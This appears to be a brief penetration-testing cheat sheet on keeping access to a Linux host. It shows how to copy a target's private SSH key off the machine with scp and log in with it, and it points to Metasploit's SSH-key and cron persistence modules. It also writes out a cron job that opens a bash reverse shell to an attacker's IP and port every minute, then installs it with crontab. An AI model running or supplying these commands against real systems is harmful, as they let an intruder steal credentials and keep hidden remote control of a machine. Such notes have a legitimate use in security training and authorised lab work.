
SSH Keys
=

id_rsa is private key
id_rsa.pub is public key

### Private Key

1. `scp remote_username@ip:/Directory/of/file ./local/directory` - copy private key to local machine from target
2. `ssh -i id_rsa user@ip`

### msfconsole

search platform:linux persistence - use ssh key persistence module


Cron Jobs
=

### msfconsole

search platform:linux persistence - use cron service persistence module

### manual

1. cat /etc/cron*

create one:

1. `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1' " > cron` -  create cronjob to run
2. `crontab -i cron` - add cron to crontab

